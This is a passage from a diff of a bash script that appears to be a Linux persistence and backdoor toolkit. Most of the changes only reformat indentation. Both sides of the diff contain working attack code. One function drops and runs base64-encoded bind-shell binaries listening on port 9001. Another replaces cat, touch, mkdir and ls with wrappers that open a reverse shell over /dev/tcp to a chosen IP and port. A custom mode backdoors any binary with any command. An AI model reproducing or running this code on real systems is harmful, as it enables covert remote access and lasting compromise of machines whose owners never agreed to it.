+	if [[ $default -eq 1 ]]; then
+		if [[ -z $architecture ]]; then
+			echo "Error: --architecture (x64/x86) must be specified when using --default."
+			exit 1
+		fi
 
-        case $architecture in
-            x86 )
-                echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
-                chmod +x /tmp/bd86
-                /tmp/bd86 &
-                echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
-                ;;
-            x64 )
-                echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
-                chmod +x /tmp/bd64
-                /tmp/bd64 &
-                echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
-                ;;
-            * )
-                echo "Error: Invalid architecture specified. Use one of x86 or x64"
-                exit 1
-        esac
+		case $architecture in
+			x86 )
+				echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
+				chmod +x /tmp/bd86
+				/tmp/bd86 &
+				echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
+				;;
+			x64 )
+				echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
+				chmod +x /tmp/bd64
+				/tmp/bd64 &
+				echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
+				;;
+			* )
+				echo "Error: Invalid architecture specified. Use one of x86 or x64"
+				exit 1
+		esac
 
-        echo "[+] The bind shell is listening on port 9001."
-        echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"
+		echo "[+] The bind shell is listening on port 9001."
+		echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"
 
-    elif [[ $custom -eq 1 ]]; then
-        if [[ -z $binary ]]; then
-            echo "Error: --binary must be specified when using --custom."
-            exit 1
-        fi
+	elif [[ $custom -eq 1 ]]; then
+		if [[ -z $binary ]]; then
+			echo "Error: --binary must be specified when using --custom."
+			exit 1
+		fi
 
-        if [[ ! -f $binary ]]; then
-            echo "Error: Specified binary does not exist: $binary"
-            exit 1
-        fi
+		if [[ ! -f $binary ]]; then
+			echo "Error: Specified binary does not exist: $binary"
+			exit 1
+		fi
 
-        chmod +x $binary
-        $binary &
-        echo "[+] Custom binary $binary granted execution privileges and executed in the background."
+		chmod +x $binary
+		$binary &
+		echo "[+] Custom binary $binary granted execution privileges and executed in the background."
 
-    else
-        echo "Error: Either --default or --custom must be specified for --bind-shell."
-        exit 1
-    fi
+	else
+		echo "Error: Either --default or --custom must be specified for --bind-shell."
+		exit 1
+	fi
 }
 
 setup_system_binary_backdoor() {
-    local default=0
-    local custom=0
-    local warning=0
-    local ip=""
-    local port=""
-    local binary=""
-    local command=""
+	local default=0
+	local custom=0
+	local warning=0
+	local ip=""
+	local port=""
+	local binary=""
+	local command=""
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --default )
-                default=1
-                ;;
-            --custom )
-                custom=1
-                ;;
-            --warning )
-                warning=1
-                ;;
-            --ip )
-                shift
-                ip=$1
-                ;;
-            --port )
-                shift
-                port=$1
-                ;;
-            --binary )
-                shift
-                binary=$1
-                ;;
-            --command )
-                shift
-                command=$1
-                ;;
-            * )
-                echo "Invalid option for --system-binary-backdoor: $1"
-                exit 1
-        esac
-        shift
-    done
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--warning )
+				warning=1
+				;;
+			--ip )
+				shift
+				ip=$1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
+			--binary )
+				shift
+				binary=$1
+				;;
+			--command )
+				shift
+				command=$1
+				;;
+			* )
+				echo "Invalid option for --system-binary-backdoor: $1"
+				exit 1
+		esac
+		shift
+	done
 
-    if [[ $default -eq 1 && $custom -eq 1 ]]; then
-        echo "Error: --default and --custom cannot be specified together."
-        exit 1
-    fi
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		exit 1
+	fi
 
-    if [[ $default -eq 0 && $custom -eq 0 ]]; then
-        echo "Error: Either --default or --custom must be specified."
-        exit 1
-    fi
+	if [[ $default -eq 0 && $custom -eq 0 ]]; then
+		echo "Error: Either --default or --custom must be specified."
+		exit 1
+	fi
 
-    if ! check_root; then
-        echo "Error: This function can only be run as root."
-        exit 1
-    fi
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
 
-    if [[ $default -eq 1 ]]; then
-        if [[ -z $ip || -z $port ]]; then
-            echo "Error: --ip and --port must be specified when using --default."
-            exit 1
-        fi
+	if [[ $default -eq 1 ]]; then
+		if [[ -z $ip || -z $port ]]; then
+			echo "Error: --ip and --port must be specified when using --default."
+			exit 1
+		fi
 
-        local binaries=("cat" "touch" "mkdir" "ls")
+		local binaries=("cat" "touch" "mkdir" "ls")
 
-        for bin in "${binaries[@]}"; do
-            if command -v $bin &> /dev/null; then
-                local path=$(command -v $bin)
-                mv $path $path.original
-                echo -e '#!/bin/bash\n/bin/bash -c "bash -i >& /dev/tcp/'$ip'/'$port' 0>&1 2>/dev/null &"\n'$path'.original "$@"' > $path
-                chmod +x $path
-                echo "[+] $bin backdoored successfully."
-            else
-                echo "[-] $bin is not present on the system."
-            fi
-        done
+		for bin in "${binaries[@]}"; do
+			if command -v $bin &> /dev/null; then
+				local path=$(command -v $bin)
+				mv $path $path.original
+				echo -e '#!/bin/bash\n/bin/bash -c "bash -i >& /dev/tcp/'$ip'/'$port' 0>&1 2>/dev/null &"\n'$path'.original "$@"' > $path
+				chmod +x $path
+				echo "[+] $bin backdoored successfully."
+			else
+				echo "[-] $bin is not present on the system."
+			fi
+		done
 
-    elif [[ $custom -eq 1 ]]; then
-        if [[ -z $binary || -z $command ]]; then
-            echo "Error: --binary and --command must be specified when using --custom."
-            exit 1
-        fi
+	elif [[ $custom -eq 1 ]]; then
+		if [[ -z $binary || -z $command ]]; then
+			echo "Error: --binary and --command must be specified when using --custom."
+			exit 1
+		fi
 
-        if [[ $warning -eq 0 ]]; then
-            echo "Error: --warning must be specified when using --custom."
-            echo "Warning: this will overwrite the original binary with the backdoored version."
-            echo "You better know what you are doing with that custom command!"
-            exit 1
-        fi
+		if [[ $warning -eq 0 ]]; then
+			echo "Error: --warning must be specified when using --custom."
+			echo "Warning: this will overwrite the original binary with the backdoored version."
+			echo "You better know what you are doing with that custom command!"
+			exit 1
+		fi
 
-        if command -v $binary &> /dev/null; then
-            local path=$(command -v $binary)
-            mv $path $path.original
-            echo -e '#!/bin/bash\n'$command' 2>/dev/null\n'$path'.original "$@"' > $path
-            chmod +x $path
-            echo "[+] $binary backdoored successfully."
-        else
-            echo "[-] $binary is not present on the system."
-        fi
-    fi
+		if command -v $binary &> /dev/null; then
+			local path=$(command -v $binary)
+			mv $path $path.original
+			echo -e '#!/bin/bash\n'$command' 2>/dev/null\n'$path'.original "$@"' > $path
+			chmod +x $path
+			echo "[+] $binary backdoored successfully."
+		else
+			echo "[-] $binary is not present on the system."
+		fi
+	fi
 }
 
 setup_udev() {
@@ -2093,7 +2178,6 @@ setup_udev() {
 	echo "[+] Udev persistence established."
 }
 
-
 main() {
 	local QUIET=0
 
@@ -2142,11 +2226,11 @@ main() {
 				setup_systemd "$@"
 				exit
 				;;
-            --generator-persistence )
-                shift
-                setup_generator_persistence "$@"
-                exit
-                ;;
+			--generator-persistence )
+				shift
+				setup_generator_persistence "$@"
+				exit
+				;;
 			--cron )
 				shift
 				setup_cron "$@"
@@ -2222,31 +2306,31 @@ main() {
 				setup_initd_backdoor "$@"
 				exit
 				;;
-			--apt-persistence )
-                shift
-                setup_apt_persistence "$@"
-                exit
-                ;;
-            --cap-backdoor )
-                shift
-                setup_cap_backdoor "$@"
-                exit
-                ;;
-            --bind-shell )
-                shift
-                setup_bind_shell "$@"
-                exit
-                ;;
-            --system-binary-backdoor )
-                shift
-                setup_system_binary_backdoor "$@"
-                exit
-                ;;
+			--package-manager-persistence )
+				shift
+				setup_package_manager_persistence "$@"
+				exit
+				;;
+			--cap-backdoor )
+				shift
+				setup_cap_backdoor "$@"
+				exit
+				;;
+			--bind-shell )
+				shift
+				setup_bind_shell "$@"
+				exit
+				;;
+			--system-binary-backdoor )
+				shift
+				setup_system_binary_backdoor "$@"
+				exit
+				;;
 			--udev )
-            	shift
-            	setup_udev "$@"
-            	exit
-            	;;
+				shift
+				setup_udev "$@"
+				exit
+				;;
 			* )
 				echo "Invalid option: $1"
 				if check_root; then
